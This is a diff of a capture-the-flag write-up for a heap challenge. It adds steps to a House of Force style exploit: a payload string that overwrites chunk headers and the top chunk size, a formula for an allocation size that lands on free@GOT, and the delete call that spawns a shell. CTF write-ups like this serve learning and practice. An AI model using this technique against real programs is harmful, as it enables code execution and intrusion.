@@ -54,10 +54,12 @@ While reconstructing the state from the chunks, it was set the top chunk as **0x
 
 "A"*120+p32(0x0)+p32(0x91)+"E"*140+p32(0x11)+p32(bin_sh)*2+p32(0x0)+p32(0xa9)+"F"*160+p32(0x0)+p32(0xffffffff)
 
+To calculate the size that will be necessary to reach the wanted function, in this case free@GOT:
 
+size = free_got_addr - 0x30 (3 (chunks) x 0x10 (header size)) - top_chunk_addr
 
+Now it needs to be created a chunk with this size and the next chunk to be created will overwrite the address you wanted (free@GOT).
 
-
-Full write-up later.
+After done, only use the delete person option on the third chunk (ID=2) to call free and get a shell.
 
 ![exploit](pwn2_final.png)
